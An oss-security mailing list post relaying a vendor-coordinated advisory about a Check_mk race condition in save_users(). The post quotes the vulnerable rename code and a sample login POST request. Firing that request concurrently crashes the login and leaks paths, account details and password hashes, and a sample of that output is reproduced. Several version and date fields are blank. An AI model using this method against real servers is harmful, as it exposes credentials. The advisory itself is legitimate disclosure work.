  oss-security - Check_mk save_users()  Race Condition leading to Sensitive Information Disclosure            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 18 Oct From: Julien Ahrens <info@...security.com> To: oss-security@...ts.openwall.com Subject: Check_mk save_users()  Race Condition leading to Sensitive Information Disclosure  RCE Security Advisory https://www.rcesecurity.com   1. ADVISORY INFORMATION ======================= Product:        Check_mk Vendor URL:     https://mathias-kettner.de/check_mk.html Type:           Race Condition Date found:     Date published: CVSSv3 Score:   7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) CVE:              2. CREDITS ========== This vulnerability was discovered and researched by Julien Ahrens from RCE Security.   3. VERSIONS AFFECTED ==================== Check_mk Check_mk Enterprise older versions may be affected too.   4. INTRODUCTION =============== Check_MK is comprehensive IT monitoring solution in the tradition of Nagios. Check_MK is available as Raw Edition, which is pure open source, and as Enterprise Edition with a lot of additional features and professional support.  (from the vendor's homepage)   5. VULNERABILITY DETAILS ======================== Check_mk is vulnerable to an unauthenticated information disclosure through a race condition during the authentication process when trying to authenticate with a valid username and an invalid password.  On a failed login, the application calls the function save_users(), which performs two os.rename operations on the files "contacts.mk.new" and "users.mk.new" (see  [..]     # Check_MK's monitoring contacts     filename = root_dir + "contacts.mk.new"     out = create_user_file(filename, "w")     out.write("# Written by Multisite UserDB\n# encoding: utf-8\n\n")     out.write("contacts.update(\n%s\n)\n" % pprint.pformat(contacts))     out.close()     os.rename(filename, filename[:-4])      # Users with passwords for Multisite     filename = multisite_dir + "users.mk.new"     make_nagios_directory(multisite_dir)     out = create_user_file(filename, "w")     out.write("# Written by Multisite UserDB\n# encoding: utf-8\n\n")     out.write("multisite_users = \\\n%s\n" % pprint.pformat(users))     out.close()     os.rename(filename, filename[:-4]) [...]  When sending many concurrent authentication requests with an existing/valid username, such as:  POST /check_mk/login.py HTTP/1.1 Host: localhost Accept: Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; Content-Length: Connection: close Upgrade-Insecure-Requests: 1  Content-Disposition: form-data; name="filled_in"  login Content-Disposition: form-data; name="_login"  1 Content-Disposition: form-data; name="_origtarget"  index.py Content-Disposition: form-data; name="_username"  omdadmin Content-Disposition: form-data; name="_password"  welcome Content-Disposition: form-data; name="_login"  Login  Then it could happen that one of both os.rename() calls references a non- existing file, which has just been renamed by a previous thread. This causes the Python script to fail and throw a crash report, which discloses a variety of sensitive information, such as internal server paths, account details including hashed passwords:  </pre></td></tr><tr class="data odd0"><td class="left">Local Variables</td><td><pre>{'contacts': {u'admin': {'alias': u'Administrator',                               'contactgroups': ['all'],                               'disable_notifications': False,                               'email': u'admin@...mple.com',                               'enforce_pw_change': False,                               'last_pw_change': 0,                               'last_seen': 0.0,                               'locked': False,                               'num_failed': 0,                               'pager': '',                               'password':                               'roles': ['admin'],                               'serial': 2},  A script to automatically exploit this vulnerability can be found on [0].  6. RISK ======= To successfully exploit this vulnerability an unauthenticated attacker must only have network-level access to the application.  The vulnerability allows remote attackers to trigger an exception, which discloses a variety of sensitive internal information such as: - Local server paths - Usernames - Passwords (hashed) - and user directory-specific attributes (i.e. LDAP)   7. SOLUTION =========== Update to   8. REPORT TIMELINE ================== Discovery of the vulnerability Sent limited information to publicly listed email address Vendor responds and asks for details Full vulnerability details sent to vendor Vendor pushes fix to git MITRE assigns Fix confirmed Public disclosure   9. REFERENCES ============= [0] [1]   Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      